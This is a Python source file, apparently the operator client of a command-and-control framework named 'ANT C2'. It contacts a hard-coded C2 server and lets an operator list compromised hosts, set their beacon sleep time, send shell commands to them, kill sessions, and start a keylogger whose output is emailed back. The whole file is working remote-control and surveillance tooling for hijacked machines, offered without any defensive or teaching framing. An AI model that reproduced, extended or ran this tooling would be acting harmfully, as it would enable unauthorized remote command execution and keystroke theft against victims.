#!/usr/bin/env python3

import json
import threading
import requests

class C2Server:

    def __init__(self):

        self.host = "http://10.109.185.88:8000"
        self.sessions = "/sessions"
        self.sess_list = []

    def get_sessions(self):

        sessions = requests.get(f"{self.host}{self.sessions}").json()

        if sessions:
            i = 0
            for ip,guid in sessions.items():
                print(f"{i} - {guid} ({ip})")
                if i not in self.sess_list:
                    self.sess_list.append({i:ip})
                    i+=1
            
            return self.sess_list
        
        else:
            print("[!] No hosts found")

    def set_sleep_time(self, session, time):

        r = requests.get(f"{self.host}/sleep?session={session}&time={time}")
        if r.status_code == 200:
            print("[+] Sleep time updated Zzzzz")

    def send_command(self, command):

        r = requests.post(f"{self.host}/exec", json=command)
        if r.status_code == 200:
            print("[+] Command will be executed shortly :)")

    def kill(self, session):

        r = requests.get(f"{self.host}/kill?session={session}")
        if r.status_code == 200:
            print(f"[+] Tasked beacon ({session}) to kill connection")

    def ping(self):
        try:
            r = requests.get(f"{self.host}/health-check")
            if r.status_code == 200:
                print(r.text)
        except requests.exceptions.ConnectionError:
            print("[!] Failed to establish a connection with C2")

    def keylogger(self, session):

        r = requests.get(f"{self.host}/keylogger?session={session}")
        if r.status_code == 200:
            print(f"[+] Started keylogger on {session}, check your mail...")


def get_action():

    # capture choice
    action = str(input("ANT C2>> "))

    # if the action chosen is sleep we are going to ask for session number and new sleep time
    if action.upper() == "SLEEP":
        while True:
            try:
                sess_list = C2Server().get_sessions()
                choice = int(input("Enter a valid session number: ")) # getting session number
                if (len(sess_list) - 1) >= choice >= 0:
                    while True:
                        try:
                            sleep_time = int(input("Set Time (only integer values are accepted)>> "))
                            C2Server().set_sleep_time(sess_list[choice][choice], sleep_time)
                            break
                        except ValueError:
                            print("[!] Enter a valid integer")
                        
                    break
            except ValueError:
                print("[!] Only integer values allowed!")


    elif action.upper() == "SHELL":
        while True:
            try:
                sess_list = C2Server().get_sessions()
                choice = int(input("Enter a valid session number: ")) # getting session number
                if (len(sess_list) - 1) >= choice >= 0:
                    while True:
                        command = str(input("Enter shell command or 'quit'>> "))
                        print(command)
                        if command == "quit":
                            break
                        elif command == "":
                            continue
                        else:
                            C2Server().send_command({sess_list[choice][choice]:command})
                    break
            except ValueError:
                print("[!] Only integer values allowed!")
            
    elif action.upper() == "EXIT":
        exit(0)
    
    elif action.upper() == "SESSIONS":
        C2Server().get_sessions()

    elif action.upper() == "CHECK":
        C2Server().ping()

    elif action.upper() == "KEYLOGGER":
        while True:
            try:
                sess_list = C2Server().get_sessions()
                choice = int(input("Enter a valid session number: ")) # getting session number
                if (len(sess_list) - 1) >= choice >= 0:
                    C2Server().keylogger(sess_list[choice][choice])
                    break
            except ValueError:
                print("[!] Only integer values allowed!")

    elif action.upper() == "KILL":
        while True:
            try:
                sess_list = C2Server().get_sessions()
                choice = int(input("Enter a valid session number: ")) # getting session number
                if (len(sess_list) - 1) >= choice >= 0:
                    C2Server().kill(sess_list[choice][choice])
                    break
            except ValueError:
                print("[!] Only integer values allowed!")


    else:
        return

def read_results():
    while True:
        try:
            with open("results.json", "r+") as f:
                content = json.load(f)
                f.seek(0)
                f.write("")
                f.truncate()
                results = str(content.get("output"))
                command = str(content.get("command")).strip()
                output = "\n\n" + "Results of " + command + ":\n" + results
                print(output)
        except Exception:
            continue

def main():
    thread = threading.Thread(target=read_results, args=(), daemon=True)
    thread.start()
    while True:
        get_action()


if __name__ == "__main__":
    main()